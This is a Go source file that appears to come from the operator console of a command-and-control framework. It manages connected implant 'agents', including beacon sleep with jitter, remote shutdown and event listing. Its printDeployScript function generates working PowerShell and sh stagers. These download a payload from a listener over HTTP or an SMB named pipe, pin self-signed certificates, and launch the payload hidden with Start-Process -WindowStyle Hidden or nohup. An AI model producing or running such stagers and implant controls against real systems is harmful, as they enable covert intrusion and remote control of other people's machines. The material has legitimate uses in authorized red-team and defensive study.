package main

import (
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"time"
	"undertow/internal/control"
	"undertow/internal/deployment"
	"undertow/internal/namedpipe"
)

func runConsoleAgentDistribution(ctx context.Context, out io.Writer, call consoleCaller, args []string) error {
	if len(args) < 2 {
		return errors.New("agent commands manage connected agents: use agents, agent events AGENT_ID, or agent shutdown AGENT_ID; use payload for deployment binaries")
	}
	if args[1] != "show" && isPayloadSubcommand(args[1]) {
		legacy := append([]string{"payload"}, args[1:]...)
		return runConsolePayload(ctx, out, call, legacy)
	}
	if args[1] == "rename" {
		if len(args) != 4 {
			return errors.New("use agent rename AGENT_NUMBER|ID|HOSTNAME NICKNAME; quote nicknames with spaces, or use \"\" to clear")
		}
		agents, err := consoleAgents(ctx, call)
		if err != nil {
			return err
		}
		agent, err := findConsoleAgent(agents, args[2])
		if err != nil {
			return err
		}
		if _, err := call(ctx, http.MethodPut, "/v1/agents/"+url.PathEscape(agent.ID)+"/nickname", map[string]string{"nickname": args[3]}); err != nil {
			return err
		}
		if args[3] == "" {
			fmt.Fprintf(out, "Nickname cleared for %s (%s).\n", agent.Hostname, agent.ID)
		} else {
			fmt.Fprintf(out, "Nickname for %s (%s) set to %q.\n", agent.Hostname, agent.ID, args[3])
		}
		return nil
	}
	if args[1] == "sleep" {
		if len(args) != 3 && len(args) != 5 {
			return errors.New("use agent sleep AGENT_ID [INTERVAL_SECONDS JITTER_PERCENT]")
		}
		agents, err := consoleAgents(ctx, call)
		if err != nil {
			return err
		}
		a, err := findConsoleAgent(agents, args[2])
		if err != nil {
			return err
		}
		if len(args) == 3 {
			if !a.SleepSupported {
				fmt.Fprintf(out, "Idle sleep is unavailable for %s (%s); rebuild its payload.\n", consoleAgentName(a), a.ID)
				return nil
			}
			fmt.Fprintf(out, "Sleep for %s (%s): %d seconds, %d%% jitter.\n", consoleAgentName(a), a.ID, a.Sleep.IntervalSeconds, a.Sleep.JitterPercent)
			return nil
		}
		interval, err := strconv.Atoi(args[3])
		if err != nil {
			return err
		}
		jitter, err := strconv.Atoi(args[4])
		if err != nil {
			return err
		}
		policy := control.SleepPolicy{IntervalSeconds: interval, JitterPercent: jitter}
		if err := policy.Validate(); err != nil {
			return err
		}
		if _, err := call(ctx, http.MethodPut, "/v1/agents/"+url.PathEscape(a.ID)+"/sleep", policy); err != nil {
			return err
		}
		fmt.Fprintf(out, "Sleep for %s (%s): %d seconds, %d%% jitter.\n", consoleAgentName(a), a.ID, interval, jitter)
		return nil
	}
	if args[1] != "shutdown" && args[1] != "events" {
		return fmt.Errorf("unknown connected-agent command %q; use agents for live sessions or payload help for deployment", args[1])
	}
	if len(args) != 3 {
		return fmt.Errorf("use agent %s AGENT_NUMBER|AGENT_ID|HOSTNAME, or select a connected agent first", args[1])
	}
	if len(args[2]) == 24 {
		if _, err := hex.DecodeString(args[2]); err == nil {
			return fmt.Errorf("%s looks like a payload ID; use payload show %s for the build, or agents to find its connected agent ID", args[2], args[2])
		}
	}
	agents, err := consoleAgents(ctx, call)
	if err != nil {
		return err
	}
	a, err := findConsoleAgent(agents, args[2])
	id := a.ID
	if err != nil {
		if args[1] != "events" || len(args[2]) != 32 {
			return err
		}
		if _, decodeErr := hex.DecodeString(args[2]); decodeErr != nil {
			return err
		}
		id = args[2]
	}
	path := "/v1/agents/" + url.PathEscape(id)
	if args[1] == "shutdown" {
		data, err := call(ctx, http.MethodPost, path+"/shutdown", nil)
		if err != nil {
			return err
		}
		if id := queuedLifecycleID(data); id != "" {
			return errors.New("server returned a background job for a foreground shutdown; update the server")
		}
		fmt.Fprintf(out, "Shutdown acknowledged by %s (agent ID %s).\n", consoleAgentName(a), a.ID)
		return nil
	}
	data, err := call(ctx, http.MethodGet, path+"/events", nil)
	if err != nil {
		return err
	}
	var events []struct {
		At                time.Time `json:"at"`
		Kind              string    `json:"kind"`
		Transport         string    `json:"transport"`
		DurationSeconds   int64     `json:"duration_seconds"`
		ReconnectAttempts uint32    `json:"reconnect_attempts"`
	}
	if err := json.Unmarshal(data, &events); err != nil {
		return err
	}
	fmt.Fprintf(out, "Lifecycle events for agent ID %s\n", id)
	if len(events) == 0 {
		fmt.Fprintln(out, "No recent lifecycle events.")
		return nil
	}
	for _, e := range events {
		fmt.Fprintf(out, "%s  %-23s %s", e.At.Local().Format("2006-01-02 15:04:05"), e.Kind, e.Transport)
		if e.DurationSeconds > 0 {
			fmt.Fprintf(out, "  duration=%s", (time.Duration(e.DurationSeconds) * time.Second).String())
		}
		if e.ReconnectAttempts > 0 {
			fmt.Fprintf(out, "  attempts=%d", e.ReconnectAttempts)
		}
		fmt.Fprintln(out)
	}
	return nil
}

func queuedLifecycleID(data []byte) string {
	var job control.JobInfo
	if err := json.Unmarshal(data, &job); err != nil || job.State != "queued" {
		return ""
	}
	return job.ID
}

func emptyDefault(value, fallback string) string {
	if value == "" {
		return fallback
	}
	return value
}

func parseProfileOptions(args []string) (profileRequest, error) {
	var req profileRequest
	for _, arg := range args {
		key, value, ok := strings.Cut(arg, "=")
		if !ok {
			return req, fmt.Errorf("profile option %q must be key=value", arg)
		}
		v := value
		switch key {
		case "server":
			req.Server = &v
		case "transport":
			req.Transport = &v
		case "domain":
			req.Domain = &v
		case "fingerprint":
			req.Fingerprint = &v
		case "auth":
			req.AuthMode = &v
		case "token":
			req.Token = &v
		case "password":
			req.Password = &v
		case "token-file", "password-file":
			b, err := os.ReadFile(value)
			if err != nil {
				return req, err
			}
			v = strings.TrimSpace(string(b))
			if key == "token-file" {
				req.Token = &v
			} else {
				req.Password = &v
			}
		case "payload-profile":
			req.PayloadProfile = &v
		case "sleep-seconds":
			seconds, err := strconv.Atoi(value)
			if err != nil {
				return req, err
			}
			req.SleepSeconds = &seconds
		case "sleep-jitter":
			percent, err := strconv.Atoi(value)
			if err != nil {
				return req, err
			}
			req.SleepJitter = &percent
		case "websocket-path":
			req.WebSocketPath = &v
		case "deployment-profile":
			profile, err := deployment.Load(value)
			if err != nil {
				return req, err
			}
			req.Deployment = &profile
		case "tls-server-name":
			req.TLSServerName = &v
		case "tls-insecure-skip-verify":
			if value != "true" && value != "false" {
				return req, errors.New("tls-insecure-skip-verify must be true or false")
			}
			b := value == "true"
			req.TLSInsecureSkipVerify = &b
		case "deny":
			req.DeniedCapabilities = &v
		case "routes":
			var routes []string
			if value != "" {
				routes = strings.Split(value, ",")
			}
			req.AdvertisedRoutes = &routes
		default:
			return req, fmt.Errorf("unknown profile option %q", key)
		}
	}
	return req, nil
}

func printDeployScript(out io.Writer, hosted hostedArtifactInfo, shell string) error {
	a := hosted.Artifact
	if hosted.PipePath != "" {
		if shell != "powershell" {
			return errors.New("SMB named-pipe delivery supports a Windows PowerShell helper only")
		}
		if err := namedpipe.ValidateRemote(hosted.PipePath); err != nil {
			return err
		}
		if len(hosted.RetrievalPath) != 49 || hosted.RetrievalPath[0] != '/' {
			return errors.New("invalid SMB pipe payload token")
		}
		if decoded, err := hex.DecodeString(hosted.RetrievalPath[1:]); err != nil || len(decoded) != 24 {
			return errors.New("invalid SMB pipe payload token")
		}
		if hosted.TLSCertSHA256 == "" {
			return errors.New("SMB pipe payload requires a TLS certificate pin")
		}
	}
	if hosted.TLSCertSHA256 != "" {
		if decoded, err := hex.DecodeString(hosted.TLSCertSHA256); err != nil || len(decoded) != sha256.Size {
			return errors.New("invalid payload host TLS certificate pin")
		}
	}
	if hosted.TLSPublicKeyPin != "" {
		if decoded, err := base64.StdEncoding.DecodeString(hosted.TLSPublicKeyPin); err != nil || len(decoded) != sha256.Size {
			return errors.New("invalid payload host TLS public key pin")
		}
	}
	switch shell {
	case "powershell":
		fmt.Fprintf(out, "param([string]$Destination = '%s')\n$ErrorActionPreference = 'Stop'\n$expected = '%s'\n", psQuote(a.Filename), a.SHA256)
		if hosted.PipePath != "" {
			parts := strings.Split(hosted.PipePath[2:], `\`)
			fmt.Fprintf(out, "$pipeHost = '%s'\n$pipeName = '%s'\n$token = '%s'\n$certPin = '%s'\n", psQuote(parts[0]), psQuote(parts[2]), hosted.RetrievalPath[1:], hosted.TLSCertSHA256)
		} else {
			fmt.Fprintf(out, "$url = '%s'\n", psQuote(hosted.Retrieval))
		}
		fmt.Fprint(out, "$Destination = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($Destination)\n$temp = $Destination + '.download'\ntry {\n")
		if hosted.PipePath != "" {
			printPipeDeployDownload(out)
		} else if hosted.TLSSelfSigned {
			fmt.Fprintf(out, "  $certPin = '%s'\n", hosted.TLSCertSHA256)
			fmt.Fprint(out, `  Add-Type -AssemblyName System.Net.Http
  $factoryName = 'UndertowArtifactTls_' + [Guid]::NewGuid().ToString('N')
  $source = @'
using System;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
public static class __FACTORY_NAME__ {
    public static HttpClientHandler CreateHandler(string pin) {
        var handler = new HttpClientHandler();
        handler.UseProxy = false;
        handler.ServerCertificateCustomValidationCallback =
            (HttpRequestMessage request, X509Certificate2 certificate, X509Chain chain, SslPolicyErrors errors) => {
                if (string.IsNullOrEmpty(pin)) return true;
                if (certificate == null) return false;
                using (var sha = System.Security.Cryptography.SHA256.Create()) {
                    var actual = BitConverter.ToString(sha.ComputeHash(certificate.RawData)).Replace("-", "");
                    return string.Equals(actual, pin, StringComparison.OrdinalIgnoreCase);
                }
            };
        return handler;
    }
}
'@
  $source = $source.Replace('__FACTORY_NAME__', $factoryName)
  if ($PSVersionTable.PSVersion.Major -lt 6) {
    $factory = Add-Type -ReferencedAssemblies System.Net.Http -TypeDefinition $source -PassThru | Where-Object { $_.Name -eq $factoryName }
  } else {
    $factory = Add-Type -TypeDefinition $source -PassThru | Where-Object { $_.Name -eq $factoryName }
  }
  $handler = $factory::CreateHandler($certPin)
  $client = [System.Net.Http.HttpClient]::new($handler)
  try {
    $client.Timeout = [TimeSpan]::FromSeconds(20)
    $endpoint = ([Uri]$url).Authority
    try {
      $response = $client.GetAsync($url, [System.Net.Http.HttpCompletionOption]::ResponseHeadersRead).GetAwaiter().GetResult()
    } catch {
      $cause = $_.Exception
      while ($cause.InnerException) { $cause = $cause.InnerException }
      throw "Cannot connect to payload listener $endpoint. Check that this host resolves to the parent agent and its TCP port is reachable. Details: $($cause.Message)"
    }
    try {
      $response.EnsureSuccessStatusCode() | Out-Null
      $source = $response.Content.ReadAsStreamAsync().GetAwaiter().GetResult()
      try {
        $target = [System.IO.File]::Create($temp)
        $transferTimeout = [System.Threading.CancellationTokenSource]::new([TimeSpan]::FromMinutes(10))
        try { $source.CopyToAsync($target, 65536, $transferTimeout.Token).GetAwaiter().GetResult() }
        finally { $transferTimeout.Dispose(); $target.Dispose() }
      } finally { $source.Dispose() }
    } finally { $response.Dispose() }
  } finally { $client.Dispose(); $handler.Dispose() }
`)
		} else {
			fmt.Fprint(out, "  Invoke-WebRequest -Uri $url -OutFile $temp\n")
		}
		fmt.Fprint(out, "  $stream = [System.IO.File]::OpenRead($temp)\n  $sha256 = [System.Security.Cryptography.SHA256]::Create()\n  try { $actual = [System.BitConverter]::ToString($sha256.ComputeHash($stream)).Replace('-', '').ToLowerInvariant() }\n  finally { $sha256.Dispose(); $stream.Dispose() }\n  if ($actual -ne $expected) { throw 'Artifact SHA-256 mismatch' }\n  Move-Item -LiteralPath $temp -Destination $Destination -Force\n  Start-Process -FilePath $Destination -WindowStyle Hidden\n} finally { Remove-Item -LiteralPath $temp -ErrorAction SilentlyContinue }\n")
	case "shell":
		curlFlags := "-fL"
		if hosted.TLSSelfSigned {
			curlFlags += " -k"
		}
		if hosted.TLSPublicKeyPin != "" {
			curlFlags += " --pinnedpubkey 'sha256//" + hosted.TLSPublicKeyPin + "'"
		}
		fmt.Fprintf(out, "#!/bin/sh\nset -eu\ndest=${1:-./%s}\ntemp=\"${dest}.download\"\ntrap 'rm -f \"$temp\"' EXIT\ncurl %s '%s' -o \"$temp\"\nactual=$(sha256sum \"$temp\" | cut -d ' ' -f 1)\n[ \"$actual\" = '%s' ] || { echo 'Artifact SHA-256 mismatch' >&2; exit 1; }\nmv -f \"$temp\" \"$dest\"\nchmod 700 \"$dest\"\nnohup \"$dest\" </dev/null >/dev/null 2>&1 &\n", a.Filename, curlFlags, shQuote(hosted.Retrieval), a.SHA256)
	default:
		return errors.New("deployment script must be powershell or shell")
	}
	return nil
}
func psQuote(s string) string { return strings.ReplaceAll(s, "'", "''") }
func shQuote(s string) string { return strings.ReplaceAll(s, "'", "'\"'\"'") }
